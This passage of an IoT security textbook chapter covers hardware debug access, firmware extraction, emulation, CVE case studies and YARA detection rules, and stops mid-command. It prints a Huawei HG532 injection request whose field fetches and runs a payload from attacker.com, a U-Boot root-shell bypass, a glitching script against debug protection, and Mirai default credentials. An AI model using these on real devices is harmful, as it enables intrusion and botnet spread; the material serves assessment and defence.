# Domain 28, Chapter 28B — IoT Device Security

> **Scope.** IoT attack surface taxonomy: hardware interfaces (UART, JTAG, SWD, SPI, I²C, eMMC — exploitation methodology for each), firmware extraction and analysis (full methodology: acquisition, unpacking, filesystem analysis, binary RE, vulnerability identification), cloud/API backend exploitation (MQTT broker misconfiguration, CoAP, device-to-cloud authentication, shadow/twin manipulation). Hard-coded credentials (discovery patterns, common defaults, credential-storage analysis). Firmware update security (unsigned OTA, downgrade, rollback, TOCTOU, secure OTA architectures). IoT botnets in depth (Mirai: architecture, scanner, loader, CnC protocol, variant evolution; Hajime: P2P DHT architecture; BrickerBot: PDoS mechanics; Reaper/IoTroop: CVE-based propagation; Mozi: DHT C2 and kill switch; newer botnets: HEH, Dark Nexus, Enemybot). UPnP/SSDP (IGD port mapping, SSDP amplification, UPnP exploitation via libupnp bugs). TR-069/CWMP (ACS architecture, Inform/GetParameterValues/SetParameterValues/Download RPCs, authentication weaknesses, mass exploitation). IoT security standards and frameworks (OWASP IoT Top 10, NIST IR 8259, ETSI EN 303 645, US Cyber Trust Mark, PSA Certified, SESIP).

---

## 1. IoT attack surface — hardware interfaces

### 1.1 UART exploitation methodology

UART (Universal Asynchronous Receiver/Transmitter) serial consoles are the most commonly-accessible debug interface on IoT devices. The exploitation methodology follows five distinct phases.

**Step 1: Physical identification.** Open the device enclosure. Identify candidate UART pins on the PCB: look for labeled test points (TX, RX, GND, VCC), unpopulated 3–4 pin headers, or pads near the main SoC. Common form factors: 4-pin 0.1" headers, 4 pads in a row, or JST connectors. On multi-layer boards, trace the pads back to the SoC datasheet's UART peripheral pins if the silkscreen is missing. Some manufacturers scrape the silkscreen or fill the via pads with solder mask to frustrate identification — a continuity check against the SoC's known UART pins (from the datasheet) resolves ambiguity.

**Step 2: Signal identification.** Use a multimeter to identify GND (continuity to the ground plane or any ground pad). Use a logic analyzer (Saleae Logic, DSLogic) or oscilloscope to identify TX: during boot, the TX pin shows activity (voltage transitions as the bootloader outputs text). RX is the remaining signal pin. VCC (if present) is at a steady voltage (3.3V or 5V). On a logic analyzer, TX appears as a burst of transitions during power-on, while RX remains quiescent (unless something is sending data to the device). GND reads as a flat 0V line.

**Step 3: Baud rate determination.** The most common baud rates for embedded UART are 115200, 9600, 57600, and 38400. Auto-detection: a logic analyzer captures the signal transitions; the shortest pulse width corresponds to one bit period; the baud rate is 1 / bit_period. Alternatively, trial-and-error with `minicom`, `screen`, or `picocom` at each common baud rate until readable text appears.

The `baudrate.py` tool (devttys0's toolkit) automates baud rate detection by cycling through standard rates while the device boots:

```bash
python baudrate.py -p /dev/ttyUSB0
```

The tool iterates through standard baud rates (110 through 921600). When readable ASCII text appears, press space to lock the rate. For logic analyzer-based detection (Saleae Logic 2): capture the TX signal during power-on, measure the shortest pulse duration. A pulse of 8.68 µs = 1 / 8.68e-6 = 115,207 baud, confirming 115200. Saleae's Async Serial analyzer can auto-detect if you specify the approximate range.

**Step 4: Connection.** Connect a USB-to-UART adapter (FTDI FT232R, CP2102, CH340) at the correct logic level (3.3V for most embedded devices, 1.8V for modern SoCs, 5V for legacy). Wiring: adapter TX → device RX, adapter RX → device TX, adapter GND → device GND. Never connect VCC unless you understand the device's power topology — back-powering through the adapter can damage either side.

```bash
picocom -b 115200 /dev/ttyUSB0            # preferred — clean exit with Ctrl-A Ctrl-X
minicom -D /dev/ttyUSB0 -b 115200         # disable HW/SW flow control in minicom -s
screen /dev/ttyUSB0 115200                 # simplest, but hard to exit cleanly
```

**Step 5: Exploitation.** The UART console may provide: a bootloader shell (U-Boot — allows modifying boot parameters, booting from alternative media, reading/writing flash memory), a Linux root shell (many IoT devices drop to a root shell on UART without authentication), a login prompt (try default credentials: root/root, admin/admin, root/<blank>, or device-specific defaults), or debug output (kernel messages, application logs — useful for reconnaissance even without a shell). From a root shell, the attacker can: extract the filesystem (`dd if=/dev/mtdN of=/tmp/dump.bin`, then transfer via `nc` or `tftp`), read credentials from configuration files, modify the firmware (add SSH keys, disable authentication, install backdoors), and pivot to the network (access other devices on the same network segment).

U-Boot shell exploitation deserves specific attention. If the device presents a U-Boot prompt (typically a 1–3 second autoboot delay with "Press any key to stop autoboot"), the attacker can:

```
# Read flash contents into RAM, then dump
U-Boot> sf probe 0         # Initialize SPI flash
U-Boot> sf read 0x82000000 0x0 0x1000000  # Read 16MB from flash to RAM
U-Boot> md.b 0x82000000 0x100             # Dump first 256 bytes

# Modify kernel boot arguments to get a root shell
U-Boot> setenv bootargs console=ttyS0,115200 root=/dev/mtdblock2 init=/bin/sh
U-Boot> boot

# Network boot: TFTP a modified kernel
U-Boot> setenv ipaddr 192.168.1.100
U-Boot> setenv serverip 192.168.1.50
U-Boot> tftpboot 0x82000000 modified_uImage
U-Boot> bootm 0x82000000
```

The `init=/bin/sh` trick bypasses the device's entire init system (including any authentication), dropping directly to a root shell. This works on any Linux-based IoT device where the U-Boot shell is accessible and boot arguments are modifiable.

**UART defense.** Disable UART at the hardware level in production: remove test points and headers from the production PCB layout (not just depopulating the connector — removing the pads entirely). If UART must remain for field diagnostics, implement authentication on the serial console (configure `getty` with a login prompt backed by `/etc/shadow`), disable the U-Boot console delay (`CONFIG_BOOTDELAY=-2` in U-Boot configuration to make autoboot non-interruptible), set a U-Boot password (`CONFIG_AUTOBOOT_KEYED=y` with `CONFIG_AUTOBOOT_PROMPT` and `CONFIG_AUTOBOOT_STOP_STR` set to a secret passphrase), and restrict U-Boot environment modification (`CONFIG_ENV_IS_NOWHERE` or lock the environment with `env lock`).

### 1.2 JTAG/SWD exploitation

JTAG provides the deepest level of hardware debug access: halt the CPU, single-step, set breakpoints, read/write all memory (RAM and memory-mapped peripherals including flash controllers), and read/write CPU registers.

**Pin identification.** JTAG has 4–5 pins: TCK (clock), TMS (mode select), TDI (data in), TDO (data out), and optionally TRST (reset). SWD (Serial Wire Debug, ARM-specific) has 2 pins: SWDIO (data) and SWCLK (clock). **JTAGulator** (Grand Idea Studio): a hardware tool that systematically tests all pin combinations on an unknown header, sending JTAG commands and checking for valid responses (IDCODE scan, boundary-scan chain detection). The JTAGulator tries all permutations of a configurable number of pins (e.g., 8 pins → 8! / (8-4)! = 1680 4-pin permutations for JTAG) and reports which combination produces a valid JTAG response.

**JTAGulator complete workflow:**

```
# Connect JTAGulator to target via jumper wires to candidate header pins
# Connect JTAGulator to host via USB serial

# 1. Set target voltage (measure VCC of the target first)
JTAG> V
Enter target voltage (1.2-3.3): 3.3

# 2. Run IDCODE scan (fastest — tests all pin combinations for valid IDCODE)
JTAG> I
Enter starting channel [0]:
Enter ending channel [7]:
# JTAGulator tries all 2-pin (SWDIO/SWCLK) combinations first (SWD IDCODE),
# then all 4-pin (TCK/TMS/TDI/TDO) combinations for JTAG IDCODE.
# Output: "IDCODE found on TCK=CH2, TMS=CH5, TDI=CH3, TDO=CH4: 0x2BA01477"

# 3. Run BYPASS scan (confirms JTAG chain and counts devices)
JTAG> B
Enter starting channel [0]:
Enter ending channel [7]:
# Uses known pins from IDCODE scan to validate the chain length.

# 4. For SWD targets (ARM Cortex-M/A/R):
JTAG> D
Enter starting channel [0]:
Enter ending channel [7]:
# Output: "SWD IDCODE found on SWDIO=CH1, SWCLK=CH2: 0x2BA01477"
```

The IDCODE value identifies the chip family: 0x2BA01477 is ARM Cortex-M (DAP), 0x4BA00477 is Cortex-A/R. Cross-reference with the ARM Debug Interface Architecture Specification or the SoC vendor's documentation.

**OpenOCD configuration for common IoT SoCs:**

ESP32 (JTAG via FTDI):

```tcl
adapter driver ftdi
ftdi vid_pid 0x0403 0x6010
ftdi channel 0
ftdi layout_init 0x0008 0x000b
adapter speed 2000
set ESP32_FLASH_VOLTAGE 3.3
source [find target/esp32.cfg]
# telnet localhost 4444 → halt → flash read_image /tmp/esp32_flash.bin 0x10000 0x200000
```

STM32F4 (SWD via ST-Link):

```tcl
source [find interface/stlink.cfg]
transport select hla_swd
source [find target/stm32f4x.cfg]
adapter speed 4000
# halt → flash read_bank 0 /tmp/stm32_flash.bin → dump_image /tmp/sram.bin 0x20000000 0x20000
# stm32f4x unlock 0  (RDP Level 1 → Level 0 — ERASES flash to remove read protection)
```

nRF52840 (SWD via J-Link):

```tcl
source [find interface/jlink.cfg]
transport select swd
source [find target/nrf52.cfg]
adapter speed 4000
# halt → flash read_bank 0 /tmp/nrf52_flash.bin 0 0x100000 → nrf5 info
# nrf5 mass_erase (required to disable APPROTECT on some revisions — erases all flash)
```

**SWD exploitation with pyOCD (Python-based, ideal for scripting):**

```bash
pip install pyocd
pyocd commander -t nrf52840
>>> savemem 0x00000000 0x100000 /tmp/nrf52_flash.bin  # dump 1MB flash
>>> savemem 0x20000000 0x40000 /tmp/nrf52_ram.bin     # dump RAM (may contain decrypted keys)
>>> break 0x0001A340     # breakpoint on crypto function (address from Ghidra)
>>> go                   # when hit, dump registers/memory to capture plaintext
>>> reg
>>> read32 0x20005000 64
```

**GDB integration with OpenOCD:**

```bash
openocd -f interface/stlink.cfg -f target/stm32f4x.cfg  # terminal 1
arm-none-eabi-gdb                                         # terminal 2
(gdb) target remote localhost:3333
(gdb) monitor halt
(gdb) monitor flash read_bank 0 /tmp/flash_dump.bin
(gdb) x/100x 0x20000000    # examine SRAM
(gdb) monitor resume
```

**JTAG/SWD defense — fuse-based debug disable:**

**STM32 Read-Out Protection (RDP):** Three levels. RDP Level 0 is no protection (debug access unrestricted). RDP Level 1 disables flash read via debug interface but allows connection (setting RDP back to Level 0 triggers a full flash erase — protects firmware confidentiality at the cost of availability). RDP Level 2 permanently disables the debug port — the SWD/JTAG pins become GPIO. Level 2 is irreversible: it burns OTP fuses in the option bytes at address `0x1FFF7800`. Set via STM32CubeProgrammer or OpenOCD:

```bash
# STM32CubeProgrammer CLI — set RDP Level 2 (IRREVERSIBLE)
STM32_Programmer_CLI -c port=SWD -ob RDP=0xCC

# OpenOCD — set RDP Level 2
openocd -f interface/stlink.cfg -f target/stm32f4x.cfg \
  -c "init; halt; stm32f4x options_write 0 0xCC; shutdown"
```

**nRF52 APPROTECT:** The `APPROTECT` register in the UICR (User Information Configuration Registers) at address `0x10001208`. Writing `0x00` to this register enables access port protection — the debug port rejects all connection attempts. On nRF52840 revision 1 and earlier, APPROTECT could be bypassed by voltage glitching the readback of the APPROTECT register (CVE-2020-26559 area — see fault injection below). Nordic released revision 2 silicon with hardware mitigations (multiple redundant reads of the protection register). Enable APPROTECT:

```bash
# Using nrfjprog (Nordic's CLI tool)
nrfjprog --rbp ALL    # enable read-back protection (APPROTECT + secure APPROTECT)
nrfjprog --verify     # verify protection is active

# Recovery (erases all flash):
nrfjprog --recover    # mass erase + disable APPROTECT (only possible if not hardware-locked)
```

**ESP32 JTAG disable:** The ESP32 eFuse system includes `JTAG_DISABLE` in the eFuse block. Once burned, the JTAG peripheral is permanently disabled. Use `espefuse.py` (part of esptool):

```bash
# Read current eFuse state
espefuse.py --port /dev/ttyUSB0 summary

# Burn JTAG_DISABLE fuse (IRREVERSIBLE)
espefuse.py --port /dev/ttyUSB0 burn_efuse JTAG_DISABLE

# For ESP32-S2/S3/C3: also disable USB-JTAG
espefuse.py --port /dev/ttyUSB0 burn_efuse DIS_USB_JTAG
```

Additionally, ESP32 supports flash encryption and secure boot via eFuses. `FLASH_CRYPT_CNT` enables flash encryption (when an odd number of bits are set, flash is encrypted). `ABS_DONE_0` enables secure boot v1 (RSA signature verification of bootloader). These eFuses are one-time-programmable and collectively establish a hardware root of trust.

**Fault injection bypass of debug protection:**

Voltage glitching uses precisely-timed voltage drops on the SoC's power supply to corrupt instruction execution. When the processor reads the APPROTECT/RDP fuse register, a well-timed glitch can cause the read to return the wrong value, effectively bypassing the protection.

ChipWhisperer (NewAE Technology) is the standard open-source platform for fault injection:

```python
import chipwhisperer as cw
import numpy as np, time

scope = cw.scope()
scope.default_setup()
scope.glitch.clk_src = "clkgen"
scope.glitch.output = "enable_only"     # crowbar glitch (shorts VCC to GND)
scope.glitch.trigger_src = "ext_single"
scope.trigger.triggers = "tio4"          # trigger on nRF52 reset rising edge

# Sweep width and offset to find the bypass window
for width in np.arange(1.0, 10.0, 0.5):
    for offset in np.arange(-40.0, 40.0, 0.5):
        scope.glitch.width = width       # % of clock cycle
        scope.glitch.offset = offset
        scope.glitch.repeat = 1
        scope.io.nrst = 'low'; time.sleep(0.05); scope.io.nrst = 'high'
        scope.arm()
        if check_debug_access():         # probe with pyOCD/OpenOCD
            print(f"BYPASS at width={width}, offset={offset}"); break
```

The bypass window is typically 1–5 ns. Electromagnetic fault injection (EMFI) via a focused EM probe achieves better spatial resolution without decapping or removing decoupling capacitors. ChipWhisperer-Husky supports EMFI probes. The LimitedResults blog documents successful APPROTECT bypass on nRF52 using both voltage and EMFI glitching.

### 1.3 SPI and I²C

**SPI flash extraction — complete methodology.**

Many IoT devices store firmware on external SPI NOR flash (Winbond W25Qxx, Macronix MX25Lxx, etc.). Extraction methods range from in-circuit reading to full chip removal.

**In-circuit extraction with Raspberry Pi:**

```bash
# Enable SPI on RPi, attach SOIC-8 test clip to flash chip
# Wiring: MOSI→SI, MISO→SO, SCLK→CLK, CE0→CS#, 3V3→VCC, GND→GND, HOLD#/WP#→VCC
# CRITICAL: hold SoC in reset to prevent bus contention

sudo flashrom -p linux_spi:dev=/dev/spidev0.0,spispeed=1000              # identify chip
sudo flashrom -p linux_spi:dev=/dev/spidev0.0,spispeed=1000 -r dump1.bin # read 1
sudo flashrom -p linux_spi:dev=/dev/spidev0.0,spispeed=1000 -r dump2.bin # read 2
md5sum dump1.bin dump2.bin  # must match — mismatch → reduce speed or fix wiring
sudo flashrom -p linux_spi:dev=/dev/spidev0.0,spispeed=1000 -w modified.bin # write back
```

**In-circuit extraction with Bus Pirate:**

```bash
# Bus Pirate connected via USB (/dev/ttyUSB0)
# Wiring: Bus Pirate to SPI flash via SOIC-8 clip
# BP MOSI → Flash SI, BP MISO → Flash SO, BP CLK → Flash CLK
# BP CS → Flash CS#, BP 3V3 → Flash VCC, BP GND → Flash GND

# flashrom with Bus Pirate
sudo flashrom -p buspirate_spi:dev=/dev/ttyUSB0,spispeed=1M -r firmware_dump.bin
```

**CH341A USB programmer (cheapest option for chip-off reading):**

```bash
# CH341A programmer with SOIC-8 clip or ZIF socket
# Desolder the SPI flash chip or use the clip in-circuit

sudo flashrom -p ch341a_spi -r firmware_dump.bin

# Verify the read
sudo flashrom -p ch341a_spi -v firmware_dump.bin
```

When `flashrom` cannot auto-detect the chip (common with less-popular flash models), specify the chip explicitly:

```bash
sudo flashrom -p linux_spi:dev=/dev/spidev0.0 -c "W25Q128.V" -r dump.bin
```

**I²C EEPROM extraction — complete methodology:**

```bash
sudo apt install i2c-tools
sudo i2cdetect -y 1                          # scan bus — 0x50 = typical 24Cxx EEPROM
sudo i2cget -y 1 0x50 0x00                   # read single byte
sudo i2cdump -y 1 0x50                       # dump all registers

# For larger EEPROMs (24C256 = 32KB) via kernel driver:
sudo modprobe i2c-dev at24
sudo dd if=/sys/bus/i2c/devices/1-0050/eeprom of=/tmp/eeprom_dump.bin bs=1 count=32768
sudo dd if=modified_eeprom.bin of=/sys/bus/i2c/devices/1-0050/eeprom bs=1 count=32768
```

EEPROMs often contain device configuration, Wi-Fi credentials (SSID + PSK in plaintext), cloud API tokens, and identity certificates. Even when main firmware is on encrypted internal flash, the EEPROM frequently stores sensitive data in cleartext.

**SPI/I²C defense.** Encrypted flash storage: ESP32's flash encryption (AES-256 in XTS mode, key stored in eFuses) encrypts external SPI flash contents — a raw dump yields ciphertext. Secure boot verifies the decrypted image's signature before execution. For I²C EEPROMs: store sensitive data encrypted, with the decryption key in a secure element (ATECC608A, STSAFE-A110) or in OTP fuses accessible only to the SoC's secure world. Enable I²C address filtering on the SoC to prevent unauthorized bus masters from reading the EEPROM.

---

## 2. Firmware analysis — full methodology

### 2.1 Acquisition

Methods (in order of increasing difficulty): (1) **Download from vendor's website** (many vendors provide firmware update files for download — the simplest acquisition). (2) **Intercept OTA update** (MitM the device's update channel — set up a proxy on the network, or use a DNS redirect to capture the update-server connection; if the connection is HTTPS, the attacker may need to install a custom CA cert on the device or exploit a certificate-validation weakness). (3) **Extract from the device** — SPI flash dump (§1.3), eMMC/NAND dump (Domain 12 Chapter 12B §2.4), or memory dump via UART/JTAG root shell (`dd if=/dev/mtdN`). (4) **Extract from a mobile app** (some IoT companion apps contain the firmware image as an asset — decompile the APK/IPA and search for firmware blobs).

### 2.2 Unpacking and filesystem extraction

**binwalk — complete workflow:**

```bash
# Step 1: Initial scan — identify embedded components by magic bytes
binwalk firmware.bin
# Output shows offsets, descriptions:
# DECIMAL       HEXADECIMAL     DESCRIPTION
# 0             0x0             TP-Link firmware header, version 1
# 512           0x200           LZMA compressed data, properties: 0x5D, dict: 8388608
# 1048576       0x100000        Squashfs filesystem, little endian, version 4.0

# Step 2: Entropy analysis — identify encrypted vs. compressed sections
binwalk -E firmware.bin
# Generates an entropy plot (entropy_firmware.bin.png)
# Compressed data: entropy ~7.0-7.8 bits/byte (high but not maximum)
# Encrypted data: entropy ~7.99 bits/byte (near-maximum, flat line)
# Plaintext/code: entropy ~4.0-6.0 bits/byte (variable, lower)
# The entropy plot distinguishes sections visually:
#   - A flat line near 8.0 = encrypted or random padding
#   - A wavy line at 7.0-7.8 = compressed filesystem
#   - Dips below 6.0 = strings, headers, configuration data

# Step 3: Architecture identification — opcode signature scan
binwalk -A firmware.bin
# Scans for CPU-specific opcode signatures:
# ARM, MIPS big/little endian, x86, PPC, SH4
# Useful when the firmware lacks ELF headers (bare-metal or custom formats)

# Step 4: Extraction — unpack all identified components
binwalk -e firmware.bin
# Creates _firmware.bin.extracted/ directory with all extracted components

# Step 5: Deep extraction — recursively extract nested archives
binwalk -eM firmware.bin
# -M enables matryoshka mode (recursive extraction of extracted files)

# Step 6: Custom extraction — extract specific signature types
binwalk --dd='squashfs:squashfs:unsquashfs %e' firmware.bin
# Extracts only squashfs filesystems and runs unsquashfs on each

# Step 7: String analysis on extracted filesystem
strings -n 8 extracted/usr/bin/httpd | grep -i "password\|secret\|key\|token"
```

**Filesystem extraction for specific formats:**

```bash
# Squashfs (most common IoT filesystem)
unsquashfs -d extracted/ filesystem.squashfs
# If unsquashfs fails, check for non-standard compression:
unsquashfs -s filesystem.squashfs  # print superblock info (compression type, block size)
# Some vendors use patched squashfs with LZMA instead of standard gzip/xz
# Use sasquatch (a patched unsquashfs that handles vendor modifications):
sasquatch -d extracted/ filesystem.squashfs

# UBIFS
ubireader_extract_images firmware.ubi
ubireader_extract_files ubifs-root/

# JFFS2
jefferson firmware.jffs2 -d extracted/

# CPIO (common in initramfs)
cpio -idmv < initramfs.cpio

# cramfs
cramfsck -x extracted/ filesystem.cramfs
```

### 2.3 Firmware emulation

**firmadyne — full-system firmware emulation:**

firmadyne emulates Linux-based firmware images in QEMU with network services, enabling interaction with web interfaces and service daemons without the physical device.

```bash
git clone --recursive https://github.com/firmadyne/firmadyne.git && cd firmadyne
./scripts/setup.sh                                                    # init database
python3 ./sources/extractor/extractor.py -b <brand> -sql 127.0.0.1 \
  -np -nk "firmware.bin" images/                                      # extract filesystem
./scripts/getArch.sh ./images/<image_id>.tar.gz                       # identify arch
./scripts/makeImage.sh <image_id>                                     # create QEMU image
./scripts/inferNetwork.sh <image_id>                                  # infer network config
./scratch/<image_id>/run.sh                                           # boot emulated firmware
# Access web UI at the displayed IP; scan with nmap; run exploits against emulated device
```

**qemu-user-static — individual binary emulation:**

When full-system emulation is unnecessary or firmadyne fails, emulate individual binaries using QEMU user-mode:

```bash
sudo apt install qemu-user-static binfmt-support

# MIPS little-endian (common in IoT routers)
cp $(which qemu-mipsel-static) extracted/usr/bin/
sudo chroot extracted /usr/bin/qemu-mipsel-static /usr/bin/httpd

# ARM
cp $(which qemu-arm-static) extracted/usr/bin/
sudo chroot extracted /usr/bin/qemu-arm-static /usr/sbin/some_service

# With library path
sudo chroot extracted /usr/bin/qemu-mipsel-static \
  -E LD_LIBRARY_PATH=/lib:/usr/lib /usr/bin/target_binary

# Debug under GDB (listen on port 1234)
sudo chroot extracted /usr/bin/qemu-mipsel-static -g 1234 /usr/bin/httpd
# Connect: gdb-multiarch → set architecture mips → target remote localhost:1234
```

**EMBA — automated firmware analysis:**

EMBA (Embedded Analyzer) performs comprehensive automated analysis of Linux-based firmware, combining static analysis, dynamic analysis (via emulation), and CVE matching:

```bash
# Clone EMBA
git clone https://github.com/e-m-b-a/emba.git
cd emba

# Install dependencies
sudo ./installer.sh -d

# Run full analysis on a firmware image
sudo ./emba -f ./path/to/firmware.bin -l ./logs/analysis_results

# Key output modules:
# S06 — file type analysis (architecture, endianness, kernel version)
# S09 — binary analysis (hardcoded IPs, URLs, credentials, crypto keys)
# S12 — binary protection checks (NX, ASLR, stack canaries, RELRO, PIE)
# S20 — shell script analysis (command injection, insecure temp files)
# S25 — kernel module analysis
# S36 — firmware binary CVE matching (cross-references binaries against NVD)
# L10 — dynamic analysis via emulation (system-mode QEMU with network)
# L15 — web service analysis (route enumeration, auth bypass testing)
```

### 2.4 Firmware comparison and CVE matching

**diffoscope — firmware version comparison:**

```bash
# Compare two firmware versions to identify patched vulnerabilities or new attack surface
diffoscope firmware_v1.0.bin firmware_v2.0.bin --html report.html

# For extracted filesystems:
diffoscope extracted_v1/ extracted_v2/ --html delta_report.html
# The HTML report shows byte-level differences, file additions/removals,
# and disassembly-level diffs for changed binaries.
```

**cve-bin-tool — identifying known-vulnerable libraries:**

```bash
# Install
pip install cve-bin-tool

# Scan an extracted firmware filesystem for known-vulnerable components
cve-bin-tool --input-file extracted/ --format json --output cve_results.json

# Scan specific binaries
cve-bin-tool extracted/usr/lib/libssl.so.1.0.0

# Output identifies: product name, version, CVE IDs, severity (CVSS), description
# Common findings in IoT firmware:
# - OpenSSL 1.0.x (dozens of CVEs)
# - BusyBox with known CVEs in networking applets
# - libcurl with TLS verification bypass CVEs
# - Dropbear SSH with authentication bypass CVEs
```

### 2.5 Credential discovery

**Automated scanning.** `grep -r "password\|passwd\|secret\|api_key\|token\|private_key" extracted/` searches the filesystem for credential-related strings. **firmwalker** (Craig Smith): an automated firmware-analysis script that searches for: SSL certificates and private keys (`*.pem`, `*.key`, `*.crt`), configuration files with credentials (`*.conf`, `*.cfg`, `*.ini`, `*.json`), shadow/passwd files (`/etc/shadow`, `/etc/passwd`), SSH keys (`id_rsa`, `authorized_keys`), hardcoded URLs and API endpoints, and email addresses.

**Common credential locations.** `/etc/shadow` (password hashes — crack with `john` or `hashcat`), `/etc/config/` (web-interface credentials, Wi-Fi passwords, cloud-API keys), `/usr/lib/lua/` (Lua scripts for the web interface — often contain admin credentials), `nvram` (non-volatile RAM — on many routers, credentials are stored as NVRAM variables accessible via `nvram show`), and database files (SQLite databases containing user accounts, API tokens).

### 2.6 Binary vulnerability analysis

After extracting the filesystem, identify network-facing binaries: the web server (lighttpd, uhttpd, mini_httpd, GoAhead, boa — all have known vulnerability histories), the MQTT client/broker, the UPnP daemon, the TR-069 agent, and any proprietary service daemons. Load each binary in Ghidra or IDA, identify the architecture (MIPS, ARM, ARM64, x86 — `file binary` or `readelf -h binary`), and analyze:

**Input handling.** Trace how HTTP request parameters, MQTT message payloads, and network packets are processed. Look for: `strcpy`/`sprintf` without bounds checking (buffer overflow), `system()`/`popen()` with user-controlled arguments (command injection), `eval()` or `os.execute()` with user input (code injection in Lua/Python scripting), and format-string vulnerabilities (`syslog(user_input)`, `printf(user_input)`).

**Authentication bypass.** Analyze the web server's authentication logic: are there hardcoded credentials? Is there a backdoor URL that bypasses authentication? Is the session-token generation predictable? Are there administrative APIs that don't require authentication?

**Known CVEs.** Cross-reference the identified software versions (from banner strings, version files, or library versions) against vulnerability databases (CVE, NVD, ExploitDB). Many IoT devices run outdated software with known, publicly-exploited vulnerabilities.

### 2.7 Real CVE case studies

**CVE-2014-9222 — Allegro RomPager "Misfortune Cookie" (CVSS 9.8, CWE-119).**

Allegro RomPager is an embedded web server used in millions of residential gateways and routers (manufactured by ZyXEL, Huawei, D-Link, TP-Link, and others via Allegro/Rompager OEM licensing). Versions prior to 4.34 contain a memory corruption vulnerability in HTTP cookie parsing. The web server allocates a fixed-size structure for HTTP cookies; a specially-crafted cookie header overwrites adjacent memory structures, including the `fortune` pointer used for HTTP session management. By controlling this pointer, an attacker achieves arbitrary read/write of device memory.

The exploitation chain: send an HTTP request with a crafted `Cookie:` header containing a specific offset calculation that overwrites the internal web server state machine. The attacker does not need any credentials. The result is unauthenticated administrative access to the device's management interface (TR-069 settings, DNS configuration, firewall rules). Check Point Research estimated 12 million devices were vulnerable at the time of disclosure. The affected RomPager version string (`RomPager/4.07`) appears in HTTP response headers, making mass scanning trivial via Shodan or Censys.

**CVE-2017-17215 — Huawei HG532 Command Injection (CVSS 8.8, CWE-78).**

The Huawei HG532 residential gateway exposes a UPnP SOAP service on port 37215 (TR-064 LAN-side management). The `DeviceUpgrade` action in the `WANIPConnection` service accepts a `NewStatusURL` and `NewDownloadURL` parameter that are passed directly to a shell command without sanitization. The exploitation is a single HTTP POST:

```http
POST /ctrlt/DeviceUpgrade_1 HTTP/1.1
Host: 192.168.1.1:37215
Content-Type: text/xml
SOAPAction: urn:schemas-upnp-org:service:WANIPConnection:1#DeviceUpgrade

<?xml version="1.0" ?>
<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/"
  s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
  <s:Body>
    <u:DeviceUpgrade xmlns:u="urn:schemas-upnp-org:service:WANIPConnection:1">
      <NewStatusURL>$(wget http://attacker.com/payload -O /tmp/payload; chmod 755 /tmp/payload; /tmp/payload)</NewStatusURL>
      <NewDownloadURL>$(echo HUAWEI)</NewDownloadURL>
    </u:DeviceUpgrade>
  </s:Body>
</s:Envelope>
```

This CVE was exploited by the Satori botnet (a Mirai variant) in December 2017, infecting hundreds of thousands of Huawei routers. The Satori author (known as "Nexus Zeta") was eventually identified and prosecuted.

**CVE-2023-20198 — Cisco IOS XE Web UI Privilege Escalation (CVSS 10.0, CWE-420).**

Cisco IOS XE devices (enterprise switches, routers, wireless controllers) running the web UI feature contain an authentication bypass in the HTTP service. An unauthenticated attacker sends a crafted HTTP request to the web management interface, which creates a local user account with privilege level 15 (full administrative access). The attacker then uses CVE-2023-20273 (a secondary command injection vulnerability) to write a Lua-based web shell implant to the device's filesystem. In October 2023, Talos identified over 40,000 compromised Cisco devices in the wild. While IOS XE is typically classified as enterprise infrastructure, many IOS XE devices serve as IoT gateways and industrial network equipment, making this CVE relevant to IoT security assessments.

Detection: search for unexplained local accounts (`show running-config | include username`), check for implant files in the device's web directory, and monitor HTTP access logs for the exploitation URI pattern.

**CVE-2020-9054 — Zyxel NAS Firmware Injection (CVSS 9.8, CWE-78).**

Multiple Zyxel NAS devices allow unauthenticated command injection via the `username` parameter of the web login CGI. The exploitation sends a POST to `/cgi-bin/weblogin.cgi` with a crafted username containing shell metacharacters. This CVE was exploited by the Emotet botnet for lateral movement within corporate networks. Zyxel released patches, but many NAS devices in SOHO environments remain unpatched.

### 2.8 YARA rules for IoT malware detection

```yara
rule Mirai_Generic {
    meta:
        description = "Detects Mirai botnet variants — scanner/credential list patterns"
        author = "IoT Security Assessment"
        date = "2025-01-15"
        severity = "critical"
    strings:
        // Mirai default credential table entries (XOR-encoded in original)
        $cred1 = "root" ascii
        $cred2 = "admin" ascii
        $cred3 = "vizxv" ascii
        $cred4 = "xc3511" ascii
        $cred5 = "888888" ascii

        // Mirai scanner strings
        $scan1 = "/bin/busybox" ascii
        $scan2 = "ECCHI" ascii       // Mirai bot identification string
        $scan3 = "LZRD" ascii        // variant identifier

        // Architecture detection strings used by the loader
        $arch1 = "\\x7fELF" ascii
        $arch2 = "/bin/sh" ascii
        $arch3 = "/proc/self/exe" ascii

        // Anti-analysis / competing malware killer
        $kill1 = "/proc/%d/cmdline" ascii
        $kill2 = "/proc/%d/status" ascii

    condition:
        uint32(0) == 0x464C457F and  // ELF magic
        (3 of ($cred*)) and
        (2 of ($scan*)) and
        (1 of ($kill*))
}

rule Mozi_Bot {
    meta:
        description = "Detects Mozi botnet — DHT P2P C2 and persistence patterns"
        date = "2025-01-15"
        severity = "critical"
    strings:
        $dht1 = "d1:ad2:id20:" ascii    // DHT protocol signature
        $dht2 = "announce_peer" ascii
        $dht3 = "get_peers" ascii

        $persist1 = "/etc/init.d/" ascii
        $persist2 = "crontab" ascii
        $persist3 = "iptables -A INPUT" ascii  // competitor blocking

        $config1 = "[ss]" ascii   // Mozi config section markers
        $config2 = "[hp]" ascii
        $config3 = "[count]" ascii

    condition:
        uint32(0) == 0x464C457F and
        (2 of ($dht*)) and
        (2 of ($persist*)) and
        (1 of ($config*))
}

rule IoT_Backdoor_Generic {
    meta:
        description = "Detects common IoT backdoor patterns — hardcoded shells, bind shells"
        date = "2025-01-15"
        severity = "high"
    strings:
        $bind1 = "socket" ascii
        $bind2 = "bind" ascii
        $bind3 = "listen" ascii
        $bind4 = "accept" ascii
        $shell1 = "/bin/sh" ascii
        $shell2 = "dup2" ascii
        $shell3 = "execve" ascii
        $teln1 = { 0xFF 0xFD 0x01 }    // Telnet DO ECHO negotiation
        $teln2 = { 0xFF 0xFB 0x01 }    // Telnet WILL ECHO negotiation

    condition:
        uint32(0) == 0x464C457F and
        filesize < 500KB and            // IoT binaries are small
        (all of ($bind*)) and
        (2 of ($shell*)) and
        (1 of ($teln*))
}
```

### 2.9 Ghidra headless analysis for batch firmware processing

```bash
# Single binary analysis with a post-script that flags dangerous functions
$GHIDRA_HOME/support/analyzeHeadless /tmp/ghidra_projects FirmwareProject \
  -import extracted/usr/bin/httpd -processor MIPS:LE:32:default \
